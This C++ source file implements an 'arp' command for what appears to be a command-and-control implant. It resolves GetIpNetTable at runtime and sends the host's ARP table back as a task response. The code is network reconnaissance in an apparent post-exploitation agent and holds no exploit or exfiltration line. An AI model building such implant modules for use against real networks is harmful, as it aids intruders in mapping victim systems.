#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_ARP

using namespace stardust;
using namespace starburst;

typedef struct _MIB_IPNETROW {
    DWORD dwIndex;
    DWORD dwPhysAddrLen;
    BYTE  bPhysAddr[8];
    DWORD dwAddr;
    DWORD dwType;
} MIB_IPNETROW;

typedef struct _MIB_IPNETTABLE {
    DWORD          dwNumEntries;
    MIB_IPNETROW   table[1];
} MIB_IPNETTABLE;

typedef DWORD (WINAPI *fn_GetIpNetTable)( MIB_IPNETTABLE*, PULONG, BOOL );

static auto declfn format_ip_arp( char* buf, DWORD ip ) -> uint32_t {
    uint8_t b[4];
    b[0] = ip & 0xFF;
    b[1] = (ip >> 8) & 0xFF;
    b[2] = (ip >> 16) & 0xFF;
    b[3] = (ip >> 24) & 0xFF;

    uint32_t off = 0;
    for ( int i = 0; i < 4; i++ ) {
        char num[4];
        int_to_str( num, b[i], 10 );
        uint32_t nlen = str_len( num );
        memory::copy( buf + off, num, nlen );
        off += nlen;
        if ( i < 3 ) buf[off++] = '.';
    }
    buf[off] = '\0';
    return off;
}

auto declfn starburst::cmd_arp(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "iphlpapi.dll" ) ) );
    if ( !h_iphlpapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
        return;
    }

    auto pGetIpNetTable = reinterpret_cast<fn_GetIpNetTable>(
        inst.kernel32.GetProcAddress( h_iphlpapi,
            symbol<LPCSTR>( "GetIpNetTable" ) ) );
    if ( !pGetIpNetTable ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIpNetTable not found" ) ) );
        return;
    }

    ULONG buf_size = 0;
    pGetIpNetTable( nullptr, &buf_size, FALSE );
    if ( buf_size == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "ARP table empty" ) ) );
        return;
    }

    auto table = static_cast<MIB_IPNETTABLE*>( inst.heap_alloc( buf_size ) );
    if ( !table ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    if ( pGetIpNetTable( table, &buf_size, TRUE ) != 0 ) {
        inst.heap_free( table );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetIpNetTable failed" ) ) );
        return;
    }

    uint32_t out_cap = 16384;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        inst.heap_free( table );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    uint32_t off = 0;
    str_copy( output + off, symbol<char*>( const_cast<char*>(
        "IP Address\tMAC Address\tType\tInterface\n" ) ) );
    off = str_len( output );

    char hex_chars[] = { '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F' };

    for ( DWORD i = 0; i < table->dwNumEntries && off + 80 < out_cap; i++ ) {
        auto& row = table->table[i];

        // IP address
        char ip_buf[24];
        uint32_t ip_len = format_ip_arp( ip_buf, row.dwAddr );
        memory::copy( output + off, ip_buf, ip_len );
        off += ip_len;
        output[off++] = '\t';

        // MAC address XX:XX:XX:XX:XX:XX
        for ( DWORD j = 0; j < row.dwPhysAddrLen && j < 6; j++ ) {
            uint8_t b = row.bPhysAddr[j];
            output[off++] = hex_chars[(b >> 4) & 0xF];
            output[off++] = hex_chars[b & 0xF];
            if ( j < row.dwPhysAddrLen - 1 && j < 5 ) output[off++] = ':';
        }
        output[off++] = '\t';

        // Type
        switch ( row.dwType ) {
            case 1:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Other" ) ) );
                off += 5;
                break;
            case 2:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Invalid" ) ) );
                off += 7;
                break;
            case 3:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Dynamic" ) ) );
                off += 7;
                break;
            case 4:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Static" ) ) );
                off += 6;
                break;
            default:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Unknown" ) ) );
                off += 7;
                break;
        }
        output[off++] = '\t';

        // Interface index
        char idx_buf[12];
        int_to_str( idx_buf, row.dwIndex, 10 );
        uint32_t idx_len = str_len( idx_buf );
        memory::copy( output + off, idx_buf, idx_len );
        off += idx_len;

        output[off++] = '\n';
    }

    output[off] = '\0';
    inst.heap_free( table );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
